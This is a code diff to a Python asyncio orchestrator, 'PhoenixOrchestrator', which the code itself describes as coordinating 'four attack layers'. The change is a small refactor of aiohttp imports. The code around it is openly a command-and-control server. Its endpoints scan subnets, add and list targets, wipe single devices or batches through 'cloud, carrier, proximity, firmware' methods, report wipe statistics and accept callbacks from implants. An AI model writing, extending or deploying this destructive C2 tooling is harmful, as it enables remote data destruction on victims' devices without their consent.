@@ -5,6 +5,7 @@ Asyncio-based orchestrator that coordinates all four attack layers.
 
 import asyncio
 import aiohttp
+from aiohttp import web
 import json
 import base64
 import os
@@ -320,7 +321,7 @@ class PhoenixOrchestrator:
 
     async def start_c2_server(self):
         """Start the C2 HTTP/HTTPS server for callbacks and control."""
-        app = aiohttp.web.Application()
+        app = web.Application()
 
         app.router.add_get("/api/status", self._handle_status)
         app.router.add_post("/api/scan", self._handle_scan)
@@ -331,7 +332,7 @@ class PhoenixOrchestrator:
         app.router.add_get("/api/stats", self._handle_stats)
         app.router.add_post("/api/callback", self._handle_callback)
 
-        runner = aiohttp.web.AppRunner(app)
+        runner = web.AppRunner(app)
         await runner.setup()
 
         if CONFIG.c2.use_ssl:
@@ -341,12 +342,12 @@ class PhoenixOrchestrator:
                     CONFIG.c2.ssl_cert_path,
                     CONFIG.c2.ssl_key_path
                 )
-            site = aiohttp.web.TCPSite(
+            site = web.TCPSite(
                 runner, CONFIG.c2.listen_host, CONFIG.c2.listen_port,
                 ssl_context=ssl_ctx
             )
         else:
-            site = aiohttp.web.TCPSite(
+            site = web.TCPSite(
                 runner, CONFIG.c2.listen_host, CONFIG.c2.listen_port
             )
 
@@ -356,7 +357,7 @@ class PhoenixOrchestrator:
                  CONFIG.c2.use_ssl)
 
     async def _handle_status(self, request):
-        return aiohttp.web.json_response({
+        return web.json_response({
             "status": "online",
             "version": CONFIG.version,
             "codename": CONFIG.codename,
@@ -367,7 +368,7 @@ class PhoenixOrchestrator:
         data = await request.json()
         subnet = data.get("subnet", "192.168.1.0/24")
         devices = await self.scan_network(subnet)
-        return aiohttp.web.json_response({
+        return web.json_response({
             "devices_found": len(devices),
             "devices": devices,
         })
@@ -395,7 +396,7 @@ class PhoenixOrchestrator:
         methods = data.get("methods", ["cloud", "carrier", "proximity", "firmware"])
         result = await self.wipe_target(target, methods)
 
-        return aiohttp.web.json_response(result, dumps=str)
+        return web.json_response(result, dumps=str)
 
     async def _handle_batch_wipe(self, request):
         data = await request.json()
@@ -403,31 +404,31 @@ class PhoenixOrchestrator:
             status_filter=data.get("status", "discovered"),
             delay=data.get("delay", CONFIG.c2.wipe_cooldown_sec)
         )
-        return aiohttp.web.json_response(result, dumps=str)
+        return web.json_response(result, dumps=str)
 
     async def _handle_get_targets(self, request):
         status = request.query.get("status")
         targets = await self.db.get_all_targets(status=status)
-        return aiohttp.web.json_response({"targets": targets}, dumps=str)
+        return web.json_response({"targets": targets}, dumps=str)
 
     async def _handle_add_target(self, request):
         data = await request.json()
         target_id = await self.db.upsert_target(data)
-        return aiohttp.web.json_response({
+        return web.json_response({
             "target_id": target_id,
             "status": "added",
         })
 
     async def _handle_stats(self, request):
         stats = await self.db.get_wipe_stats()
-        return aiohttp.web.json_response(stats)
+        return web.json_response(stats)
 
     async def _handle_callback(self, request):
         """Handle callbacks from implants."""
         data = await request.json()
         log.info("[+] Callback from %s: %s",
                  data.get("device_id", "unknown"), data.get("type", "unknown"))
-        return aiohttp.web.json_response({"ack": True})
+        return web.json_response({"ack": True})
 
     # ─── Main Loop ────────────────────────────────────────────────────
 
